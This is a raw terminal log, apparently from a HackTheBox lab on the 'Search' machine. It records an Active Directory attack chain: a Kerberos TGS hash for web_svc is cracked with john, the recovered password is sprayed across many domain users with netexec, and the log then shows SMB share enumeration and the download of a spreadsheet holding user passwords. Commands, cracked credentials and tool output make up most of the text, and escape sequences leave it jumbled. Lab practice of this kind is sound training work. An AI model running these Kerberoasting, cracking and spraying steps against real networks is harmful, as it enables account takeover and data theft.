+LDAP        10.129.229.57   389    RESEARCH         $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb\web_svc*$2e40402960a55e91c4a3f78cd641c24a$57102aca28cf937ac7f83f05d86dae3a19431908ee97beaf213faa6089221ae0344d986094a9ae13d370ce2cca41be8e7f8ce99ef0178add8fbebfdb264de7c7a970dd4999a3260e9902de9ab5d080fb1c39db1e21c3d94b7bcef80e7598003a5c74aa22286410f1967e7521e02d541238c5f7161532db3f99238e73c03c42c37177eadc0197cf8a8907d7304ae9cad2c08bf2c27816b0d13ab75437032042d7cd915e7b5e9cace0d898c05f876de421d04f94c4c5201d173de09bc1c06c674dfcddd135f3856e7098c9bfeb82ccfad5f40c97f319e11369feb33742579514eef6ac086ba4c488c9c1e32e91e5e22d9f8cd8373afb395ec8d44263ca0c09bb7c540bdd780048f29db36e573a2d00ea11d99c4f18e2c272a80962751fc0f51be67eefba33372620239eec185b75a4b45c2113e873bdd73ae800acfd6ec7aec96db214a53c8a97a9e069148dc8b8d65e00beb39ad199f252423cf853c9ff6fba486d4dd910676613929d660fcbb7fd7ab078804a117b0b0e33538677e3ed6a1e9e7828d21879b5637944c1cf3873efb83ba1d35d23a3ad518b369699e82eb40cf146c88b6db18bab8081a7bf1e59013508a0d3129337151146d4918028089c68e7b674ff4d23a67039b71489ae84be8fbef17d9acaf7333a64b7
+$ [20:58:30] john $BoxDir/loot/kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+$ [20:59:20] boxset Username2 web_svc
+boxset Password2 '@3ONEmillionbaby'
+
+$ [20:59:35] netexec smb $BoxIP -u $Username2 -p $Password2
+8eeda6569c96268638ddad850ddef53c7cc83298919201e6cb283fb92de0b2bd078a4ff4d36a5d1d24f777d6a00ce9ae5df76f0b6ace519c6018683f6036dcfc4acf0ea3cf09bc0ea1b77bf869090b5628f47b526cdd382ea731e956b8266eda4765a682d2184603034e27da8c2e766852537256225f0d3e502c9d2296c40281ebb9f3ecfa5ef6169725e4251f2b4e492853109a7376caa29c9a5b25bc0b08e4cdd4b068dcb4e81df516dc156a43593260a2b78b0ab88b7ae375cb11f37cddbb631b0b458a4464591ce420693b0c306295096676439ad4c897f658440d8d177043f484841aa1e027046a62ffa80e89415afecfe624dabf135c48aa4e51690a6260fcef520c61f215b929fcaa0bf11574063b6e62151d30105ae6352563bcc6888d60c4513e2db16801ea9eb8d11ead7a4307e7f3c4bf4b4a26c4e9d2c1673a6575ccf277bab6ea2345c75aa00b9c5193539dac4c2778e1c7634db440aa223ee111935b7d0435f11d6caf6f4d293fc6b5e835aadb20f1ac5efe80270fbfe7c50988a4c7f69eb12257fe9303d31a0b4d40678d4c0cfca0a07282d94a9e9fd4662eb27b4fad85949450ef9ce420cbe428b4ee524245109106b4054161a80fa70be617c7ef75023020b3cb91fb57381246abce87b690fd6b90ec4ec6cae9688c03112a9617476d521f449c8549243a96ac1c5a53a7a901e02a7636bb5dbc6cfd02152f2361b1ce9b3db751e903e95c64cb252d9144388f498c21354e9dedb6eb3aed29d7cbf52fd8f0a9d610b14373ff32ccba477c32d4f1968fa84abfdf
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:57:18] $ =john $BoxDir/loot/kerberoast.txt --wordlist=/usr/share/wordlists/rockyou.txtjohn>
+]133;C\Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+@3ONEmillionbaby (?)     
+1g 0:00:00:04 DONE (2026-09-13 20:58) 0.2293g/s 2635Kp/s 2635Kc/s 2635KC/s @421eduymayte619..@#ann!#
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:58:35] $ =boxset Username2 web_svc
+boxset Password2 '@3ONEmillionbaby'boxsetboxset'@3ONEmillionbaby'>
+]133;C\[+] Username2=web_svc (saved to .env)
+[+] Password2=@3ONEmillionbaby (saved to .env)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:59:20] $ =netexec smb $BoxIP -u $Username2 -p $Password2netexec>
+]133;C\SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby 
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [20:59:36] $ =nete
+$ [21:00:07] netexec smb $BoxIP -u $Username2 -p $Password2 --shares
+
+$ [21:00:26] netexec smb $BoxIP -u $BoxDir/loot/usernames.txt -p $Password2 --continue-on-success
+xec smb $BoxIP -u $Username2 -p $Password2 --sharesnetexec>
+]133;C\SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby 
+SMB         10.129.229.57   445    RESEARCH         [*] Enumerated shares
+SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
+SMB         10.129.229.57   445    RESEARCH         -----           -----------     ------
+SMB         10.129.229.57   445    RESEARCH         ADMIN$                          Remote Admin
+SMB         10.129.229.57   445    RESEARCH         C$                              Default share
+SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share
+SMB         10.129.229.57   445    RESEARCH         helpdesk                        
+SMB         10.129.229.57   445    RESEARCH         IPC$            READ            Remote IPC
+SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share 
+SMB         10.129.229.57   445    RESEARCH         RedirectedFolders$ READ,WRITE      
+SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share 
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:00:09] $ =netexec smb $BoxIP -u $BoxDir/loot/usernames.txt -p $Password2 --continue-on-successnetexec>
+]133;C\SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\abril.suarez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Angie.Duffy:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Antony.Russo:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\belen.compton:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Cameron.Melendez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\chanel.bell:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Claudia.Pugh:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Cortez.Hickman:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\dax.santiago:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Eddie.Stevens:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\edgar.jac
+$ [21:01:35] boxset Username3 edgar.jacobs
+
+$ [21:01:51] netexec smb $BoxIP -u $Username3 -p $Password2 --shares
+obs:@3ONEmillionbaby 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Edith.Walls:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\eve.galvan:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\frederick.cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\hope.sharp:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\jayla.roberts:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Jordan.Gregory:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\payton.harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Reginald.Morton:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\santino.benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\Savanah.Velazquez:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\sierra.frye:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\trace.ryan:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+SMB         10.129.229.57   445    RESEARCH         [-] search.htb\3246079:@3ONEmillionbaby STATUS_LOGON_FAILURE 
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:00:30] $ =boxset Username3 edgar.jacobsboxset>
+]133;C\[+] Username3=edgar.jacobs (saved to .env)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:01:35] $ =netexec smb $BoxIP -u $Username3 -p $Password2 --sharesnetexec>
+]133;C\SMB         10.129.229.57   445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.57   445    RESEARCH         [+] search.htb\edgar.jacobs:@3ONEmillionbaby 
+SMB         10.129.229.57   445    RESEARCH         [*] Enumerated shares
+SMB         10.129.229.57   445    RESEARCH         Share           Permissions     Remark
+SMB         10.129.229.57   445    RESEARCH         -----           -----------     ------
+SMB         10.129.229.57   445    RESEARCH         ADMIN$                          Remote Admin
+SMB         10.129.229.57   445    RESEARCH         C$                              Default share
+SMB         10.129.229.57   445    RESEARCH         CertEnroll      READ            Active Directory Certificate Services share[
+$ [21:02:58] smbclient //$BoxIP/helpdesk -U $Domain/$Username3%$Password2 -c "ls"
+
+$ [21:03:19] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs"
+
+$ [21:03:35] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs/"
+
+$ [21:03:52] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs/Desktop"
+0m
+SMB         10.129.229.57   445    RESEARCH         helpdesk        READ            
+SMB         10.129.229.57   445    RESEARCH         IPC$            READ            Remote IPC
+SMB         10.129.229.57   445    RESEARCH         NETLOGON        READ            Logon server share 
+SMB         10.129.229.57   445    RESEARCH         RedirectedFolders$ READ,WRITE      
+SMB         10.129.229.57   445    RESEARCH         SYSVOL          READ            Logon server share 
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:01:53] $ =smbclient //$BoxIP/helpdesk -U $Domain/$Username3%$Password2 -c "ls"smbclient"ls">
+]133;C\  .                                  Dc        0  Tue Apr 14 11:24:23 2020
+  ..                                 Dc        0  Tue Apr 14 11:24:23 2020
+
+		3246079 blocks of size 4096. 764568 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:02:59] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs"smbclient"ls edgar.jacobs">
+]133;C\  edgar.jacobs                       Dc        0  Thu Apr  9 21:04:11 2020
+
+		3246079 blocks of size 4096. 764568 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:03:19] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs/"smbclient"ls edgar.jacobs/">
+]133;C\  .                                  Dc        0  Thu Apr  9 21:04:11 2020
+  ..                                 Dc        0  Thu Apr  9 21:04:11 2020
+  Desktop                           DRc        0  Mon Aug 10 11:02:16 2020
+  Documents                         DRc        0  Mon Aug 10 11:02:17 2020
+  Downloads                         DRc        0  Mon Aug 10 11:02:17 2020
+
+		3246079 blocks of size 4096. 764568 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:03:35] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs/Desktop"smbclient"ls edgar.jacobs/Desktop">
+]133;C\  Desktop                           DRc        0  Mon Aug 10 11:02:16 2020
+
+		3
+$ [21:04:10] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs/Downloads"
+
+$ [21:04:23] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs/Documents"
+
+$ [21:04:49] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/"
+
+$ [21:05:15] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/Desktop"
+246079 blocks of size 4096. 764566 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:03:53] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs/Downloads"smbclient"ls edgar.jacobs/Downloads">
+]133;C\  Downloads                         DRc        0  Mon Aug 10 11:02:17 2020
+
+		3246079 blocks of size 4096. 764566 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:04:10] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs/Documents"smbclient"ls edgar.jacobs/Documents">
+]133;C\  Documents                         DRc        0  Mon Aug 10 11:02:17 2020
+
+		3246079 blocks of size 4096. 764566 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:04:24] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/"smbclient"ls sierra.frye/">
+]133;C\  .                                  Dc        0  Thu Nov 18 01:01:46 2021
+  ..                                 Dc        0  Thu Nov 18 01:01:46 2021
+  Desktop                           DRc        0  Thu Nov 18 01:08:00 2021
+  Documents                         DRc        0  Fri Jul 31 15:42:19 2020
+  Downloads                         DRc        0  Fri Jul 31 15:45:36 2020
+  user.txt                          ARc       34  Sun Sep 13 13:21:44 2026
+
+		3246079 blocks of size 4096. 764566 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:04:49] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/Desktop"smbclient"ls sierra.frye/Desktop">
+]133;C\  Desktop                           DRc        0  Thu Nov 18 01:08:00 2021
+
+		3246079 blocks of size 4096. 764566 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\[
+$ [21:05:30] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/Downloads"
+
+$ [21:05:45] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/Documents"
+
+$ [21:06:10] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/Downloads/"
+
+$ [21:06:44] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "get sierra.frye/user.txt /tmp/user.txt" && cat /tmp/user.txt
+
+$ [21:07:09] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/Desktop/"
+24mkali@kali:~/Platforms/HackTheBox/Search [21:05:15] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/Downloads"smbclient"ls sierra.frye/Downloads">
+]133;C\  Downloads                         DRc        0  Fri Jul 31 15:45:36 2020
+
+		3246079 blocks of size 4096. 764564 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:05:30] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/Documents"smbclient"ls sierra.frye/Documents">
+]133;C\  Documents                         DRc        0  Fri Jul 31 15:42:19 2020
+
+		3246079 blocks of size 4096. 764546 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:05:45] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/Downloads/"smbclient"ls sierra.frye/Downloads/">
+]133;C\NT_STATUS_ACCESS_DENIED listing \sierra.frye\Downloads\
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:06:11] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "get sierra.frye/user.txt /tmp/user.txt" && cat /tmp/user.txtsmbclient"get sierra.frye/user.txt /tmp/user.txt"cat>
+]133;C\NT_STATUS_ACCESS_DENIED opening remote file \sierra.frye\user.txt
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:06:44] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls sierra.frye/Desktop/"smbclient"ls sierra.frye/Desktop/">
+]133;C\  .                                 DRc        0  Thu Nov 18 01:08:00 2021
+  ..                                DRc        0  Thu Nov 18 01:08:00 
+$ [21:07:26] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "get \"sierra.frye/Desktop/user.txt\" /tmp/user.txt" && cat /tmp/user.txt
+
+$ [21:07:47] smbclient //$BoxIP/helpdesk -U $Domain/$Username3%$Password2 -c "ls /"
+
+$ [21:08:04] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "recurse ON; ls" 2>/dev/null | grep -i xlsx
+
+$ [21:08:25] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "recurse ON; ls" 2>/dev/null | grep -i xlsx -B 20 | grep -E "^\.|Dc|xlsx"
+2021
+  $RECYCLE.BIN                     DHSc        0  Tue Apr  7 19:03:59 2020
+  desktop.ini                      AHSc      282  Fri Jul 31 15:42:15 2020
+  Microsoft Edge.lnk                 Ac     1450  Tue Apr  7 13:28:05 2020
+  user.txt                          ARc       34  Sun Sep 13 13:21:44 2026
+
+		3246079 blocks of size 4096. 764538 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:07:10] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "get \"sierra.frye/Desktop/user.txt\" /tmp/user.txt" && cat /tmp/user.txtsmbclient"get \"sierra.frye/Desktop/user.txt\" /tmp/user.txt"cat>
+]133;C\NT_STATUS_ACCESS_DENIED opening remote file \sierra.frye\Desktop\user.txt
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:07:26] $ =smbclient //$BoxIP/helpdesk -U $Domain/$Username3%$Password2 -c "ls /"smbclient"ls /">
+]133;C\  .                                  Dc        0  Tue Apr 14 11:24:23 2020
+  ..                                 Dc        0  Tue Apr 14 11:24:23 2020
+
+		3246079 blocks of size 4096. 764518 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:07:47] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "recurse ON; ls" 2>/dev/null | grep -i xlsxsmbclient"recurse ON; ls" 2>/dev/nullgrep>
+]133;C\  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 11:35:44 2020
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:08:07] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "recurse ON; ls" 2>/dev/null | grep -i xlsx -B 20 | grep -E "^\.|Dc|xlsx"smbclient"recurse ON; ls" 2>/dev/nullgrepgrep"^\.|Dc|xlsx">
+]133;C\  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 11:35:44 2020
+$ [21:09:00] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "recurse ON; mget *Phishing*"
+
+$ [21:09:22] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs/Desktop/"
+
+$ [21:09:38] smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "get \"edgar.jacobs/Desktop/Phishing_Attempt.xlsx\" $BoxDir/loot/Phishing_Attempt.xlsx"
+
+$ [21:10:08] unzip -l $BoxDir/loot/Phishing_Attempt.xlsx
+
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:08:28] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "recurse ON; mget *Phishing*"smbclient"recurse ON; mget *Phishing*">
+]133;C\NT_STATUS_NO_SUCH_FILE listing \*Phishing*
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:09:01] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "ls edgar.jacobs/Desktop/"smbclient"ls edgar.jacobs/Desktop/">
+]133;C\  .                                 DRc        0  Mon Aug 10 11:02:16 2020
+  ..                                DRc        0  Mon Aug 10 11:02:16 2020
+  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 21:05:29 2020
+  desktop.ini                      AHSc      282  Mon Aug 10 11:02:16 2020
+  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 21:05:03 2020
+  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 11:35:44 2020
+
+		3246079 blocks of size 4096. 764518 blocks available
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:09:22] $ =smbclient //$BoxIP/RedirectedFolders$ -U $Domain/$Username3%$Password2 -c "get \"edgar.jacobs/Desktop/Phishing_Attempt.xlsx\" $BoxDir/loot/Phishing_Attempt.xlsx"smbclient"get \"edgar.jacobs/Desktop/Phishing_Attempt.xlsx\" $BoxDir/loot/Phishing_Attempt.xlsx">
+]133;C\getting file \edgar.jacobs\Desktop\Phishing_Attempt.xlsx of size 23130 as /home/kali/Platforms/HackTheBox/Search/loot/Phishing_Attempt.xlsx (115.8 KiloBytes/sec) (average 115.8 KiloBytes/sec)
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:09:39] $ =unzip -l $BoxDir/loot/Phishing_Attempt.xlsxunzip>
+]133;C\Archive:  /home/kali/Platforms/HackTheBox/Search/loot/Phishing_Attempt.xlsx
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+     1996  1980-01-01 00:00   [Content_Types].xml
+
+$ [21:10:25] unzip -p $BoxDir/loot/Phishing_Attempt.xlsx xl/sharedStrings.xml | xmllint --format - 2>/dev/null
+      588  1980-01-01 00:00   _rels/.rels
+     1924  1980-01-01 00:00   xl/workbook.xml
+      972  1980-01-01 00:00   xl/_rels/workbook.xml.rels
+     5732  1980-01-01 00:00   xl/worksheets/sheet1.xml
+     4696  1980-01-01 00:00   xl/worksheets/sheet2.xml
+     8390  1980-01-01 00:00   xl/theme/theme1.xml
+    17042  1980-01-01 00:00   xl/styles.xml
+     1629  1980-01-01 00:00   xl/sharedStrings.xml
+     1232  1980-01-01 00:00   xl/drawings/drawing1.xml
+     8669  1980-01-01 00:00   xl/charts/chart1.xml
+     9863  1980-01-01 00:00   xl/charts/style1.xml
+      878  1980-01-01 00:00   xl/charts/colors1.xml
+      464  1980-01-01 00:00   xl/worksheets/_rels/sheet1.xml.rels
+      322  1980-01-01 00:00   xl/worksheets/_rels/sheet2.xml.rels
+      293  1980-01-01 00:00   xl/drawings/_rels/drawing1.xml.rels
+      399  1980-01-01 00:00   xl/charts/_rels/chart1.xml.rels
+     4840  1980-01-01 00:00   xl/printerSettings/printerSettings1.bin
+     4840  1980-01-01 00:00   xl/printerSettings/printerSettings2.bin
+      396  1980-01-01 00:00   xl/calcChain.xml
+      580  1980-01-01 00:00   docProps/core.xml
+      807  1980-01-01 00:00   docProps/app.xml
+---------                     -------
+    76552                     22 files
+%                                                                                                                      ]7;file:///home/kali/Platforms/HackTheBox/Search\]666;vte.shell.postexec=0\]666;vte.shell.precmd!\kali@kali:~/Platforms/HackTheBox/Search [21:10:08] $ =unzip -p $BoxDir/loot/Phishing_Attempt.xlsx xl/sharedStrings.xml | xmllint --format - 2>/dev/nullunzipxmllint2>/dev/null>
+]133;C\<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="49" uniqueCount="49">
+  <si>
+    <t>firstname</t>
+  </si>
+  <si>
+    <t>lastname</t>
+  </si>
+  <si>
+    <t>password</t>
+  </si>
+  <si>
+    <t>Payton</t>
+  </si>
+  <si>
+    <t>Harmon</t>
+  </si>
+  <si>
+    <t>Cortez</t>
+  </si>
+  <si>
+    <t>Hickman</t>
+  </si>
+  <si>
+    <t>Bobby</t>
+  </si>
+  <si>
+    <t>Wolf</t>
+  </si>
+  <si>
+    <t>Margaret</t>
+  </si>
+  <si>
+    <t>Robinson</t>
+  </si>
+  <si>
+    <t>Costa</t>
+  </si>
+  <si>
+    <t>Scarlett</t>
+  </si>
+  <si>
+    <t>Parks</t>
+  </si>
+  <si>
+    <t>Eliezer</t>
+  </si>
+  <si>
+    <t>Jordan</t>
+  </si>
+  <si>
+    <t>Hunter</t>
+  </si>
+  <si>
+    <t>Kirby</t>
+  </si>
+  <si>
+    <t>Annabelle</t>
+  </si>
+  <si>
+    <t>Wells</t>
+  </si>
+  <si>
+    <t>Eve</t>
+  </si>
+  <si>
+    <t>Galvan</t>
+  </si>
+  <si>
+    <t>Jeramiah</t>
+  </si>
+  <si>
+    <t>Fritz</t>
+  </si>
+  <si>
+    <t>Abby</t>
+  </si>
+  <si>
+    <t>Gonzalez</t>
+  </si>
+  <si>
+    <t>Joy</t>
+  </si>
+  <si>
+    <t>Vincent</t>
